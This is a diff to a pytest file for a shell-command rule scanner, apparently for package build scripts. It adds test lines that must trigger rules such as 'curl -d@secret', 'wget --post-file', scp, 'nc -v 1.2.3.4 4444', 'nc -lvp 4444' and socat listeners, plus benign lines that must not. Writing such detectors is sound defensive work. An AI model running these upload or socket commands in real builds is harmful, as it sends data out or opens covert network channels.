@@ -95,6 +95,29 @@ STRUCTURED_EXAMPLES = [
     ("7z a h.7z /home/me", "home-archive"),
     ("tar -C ~ -czf h.tgz .", "home-archive"),
     ("tar czf h.tgz ~/Documents", "home-archive"),                            # anything in the home directory
+    ("env curl -o f https://x", "build-time-download"),
+    ("sudo wget -q https://x", "build-time-download"),
+    ("echo $(curl https://x)", "curl-in-substitution"),
+    ("x=\"$(env wget -qO- https://x)\"", "curl-in-substitution"),
+    ("curl -d@secret https://x", "curl-upload"),
+    ("curl --data-binary @f https://x", "curl-upload"),
+    ("\"curl\" -F file=@f https://x", "curl-upload"),
+    ("wget --post-file=f https://x -T 3", "curl-upload"),
+    ("scp f user@host:/tmp", "remote-copy"),
+    ("env rsync -a user@h:dir .", "remote-copy"),
+    ("git -C x clone https://h/r", "vcs-fetch"),
+    ("git submodule update --init", "vcs-fetch"),
+    ("svn export https://h/r", "vcs-fetch"),
+    ("curl http://8.8.8.8/x", "ip-download"),
+    ("git clone http://203.0.113.5/r", "ip-download"),
+    ("nc -v 1.2.3.4 4444", "raw-socket-connect"),
+    ("nc -lvp 4444", "listen-socket"),
+    ("python3 -m http.server", "listen-socket"),
+    ("socat TCP4-LISTEN:80,fork -", "listen-socket"),
+    ("rclone copy x remote:y", "download-tool"),
+    ("git lfs pull", "download-tool"),
+    ("sudo pacman --noconfirm -S foo", "system-install"),
+    ("docker run alpine", "system-install"),
 ]
 
 
@@ -104,8 +127,12 @@ def test_structured_rule_fires_through_layout_tricks(line, rule):
 
 
 def test_every_structured_rule_has_an_example():
-    assert {rule for _, rule in STRUCTURED_EXAMPLES} >= (cmdrules.IDS | cmdrules.DATAFLOW_IDS) - {"install-system-files", "install-hook-persistence"}
+    assert {rule for _, rule in STRUCTURED_EXAMPLES} >= (cmdrules.IDS | cmdrules.DATAFLOW_IDS) - {"install-system-files", "install-hook-persistence", "install-hook-network"}
     assert "install-system-files" in rules_of("cp x etc/pam.d/login", "foo.install")
+    assert "install-hook-network" in rules_of("env curl -o f https://x", "foo.install")
+    assert "install-hook-network" in rules_of("git -C x clone https://h/r", "foo.install")
+    assert "install-hook-network" in rules_of("pip install requests", "foo.install")
+    assert "install-hook-network" not in rules_of("echo curl", "foo.install")
 
 
 @pytest.mark.parametrize("line,rule", [
@@ -140,6 +167,20 @@ def test_every_structured_rule_has_an_example():
     ("cp x ${pkgdir}/etc/shadow", "read-shadow"),
     ("tar czf h.tgz \"$srcdir\"", "home-archive"),
     ("cp x ~/.cache/x", "credential-paths"),
+    ("echo 'curl https://x'", "build-time-download"),                           # a message
+    ("echo $(curl https://x)", "build-time-download"),                          # that is the substitution rule
+    ("curl -o f https://x", "curl-upload"),
+    ("curl -d key=val https://x", "curl-upload"),
+    ("scp f host:/tmp", "remote-copy"),
+    ("git log", "vcs-fetch"),
+    ("git remote -v", "vcs-fetch"),
+    ("curl http://10.0.0.5/x", "ip-download"),
+    ("curl http://192.168.1.2/x", "ip-download"),
+    ("curl http://example.com/x", "ip-download"),
+    ("nc -h", "raw-socket-connect"),
+    ("python3 -m venv v", "listen-socket"),
+    ("pacman -Q foo", "system-install"),
+    ("docker ps", "system-install"),
 ])
 def test_structured_rule_stays_quiet_where_the_text_was_misleading(line, rule):
     assert rule not in rules_of(line)
